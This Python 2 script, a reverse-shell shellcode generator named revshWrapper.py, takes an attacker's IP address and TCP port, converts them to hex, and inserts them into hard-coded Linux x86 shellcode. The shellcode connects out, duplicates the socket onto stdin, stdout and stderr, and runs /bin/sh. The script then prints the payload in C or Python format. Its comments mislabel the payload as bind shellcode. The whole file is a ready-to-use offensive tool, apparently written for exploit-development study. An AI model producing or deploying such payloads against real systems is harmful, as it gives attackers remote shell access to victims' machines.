#!/usr/bin/python
# Filename: revshWrapper.py
# Author:   boku

## TCP Port
# Take users TCP port as input
port = raw_input("Enter TCP Port Number: ")
# Convert input string to an integer
deciPort = int(port)
# Format the integer to Hex Integer
hexPort = "{:02x}".format(deciPort)
# Check the length of the output hex string
hexStrLen = len(hexPort)
# Check if the hex string is even or odd with modulus 2
oddEven = hexStrLen % 2
# if it returns 1 then it's odd. We need to add a leading 0
if oddEven == 1:
    hexPort = "0" + hexPort
# converts the  port number into the correct hex format
tcpPort = "\\x".join(hexPort[i:i+2] for i in range(0,len(hexPort), 2))
print "Your TCP Port in Hex is:","\\x"+tcpPort
nullCheck = deciPort % 256
if nullCheck == 0 :
    print "Your TCP Port contains a Null 0x00."
    print "Try again with a different Port Number."
    exit(0)

## IP Address
# Take users IP Address as input
ipAddrStr = raw_input("Enter IP Address [127.1.1.1]: ")
if ipAddrStr == "" :
        ipAddrStr = "127.1.1.1"
formatIP = ipAddrStr.split('.')
hexIP = '{:02x}{:02x}{:02x}{:02x}'.format(*map(int, formatIP))
# converts the ip address into the correct hex format
ipAddr = "\\x".join(hexIP[i:i+2] for i in range(0,len(hexIP), 2))
print "Your IP Address in Hex is:","\\x"+ipAddr
#print "\\x"+ipAddr   # debugging

## Shellcode
scPart1 = "\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89"
scPart1 += "\xe1\xcd\x80\x96\x31\xc0\x43\x68"
#ipAddr = "\x7f\x01\x01\x01" # IP 127.1.1.1
scPart2 = "\x66\x68" # Push Word
# tcpPort = "\x05\x39" # TCP Port 1337
scPart3 = "\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0"
scPart3 += "\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9"
scPart3 += "\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
scPart3 += "\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"

# Initiate the Shellcode variable we will output
shellcode = ""

# Add the first part of the tcp bind shellcode
for x in bytearray(scPart1) :
    shellcode += '\\x'
    shellcode += '%02x' %x
# Add the user input id address to the shellcode
shellcode += "\\x"+ipAddr
# Add the second part of the tcp bind shellcode
for x in bytearray(scPart2) :
    shellcode += '\\x'
    shellcode += '%02x' %x
# Add the user added tcp port to the shellcode
shellcode += "\\x"+tcpPort
# Add the third part of the tcp bind shellcode
for x in bytearray(scPart3) :
    shellcode += '\\x'
    shellcode += '%02x' %x

print "Choose your shellcode export format."
exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
if exportFormat == "2" :
    formatSC = '"\nshellcode += "'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[-----------------------Your-Shellcode------------------------]"
    print 'shellcode = "'+formatSC+'"'
else :
    formatSC = '"\n"'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[----------------Your-Shellcode------------------]"
    print 'unsigned char shellcode[] = \\\n"'+formatSC+'";'
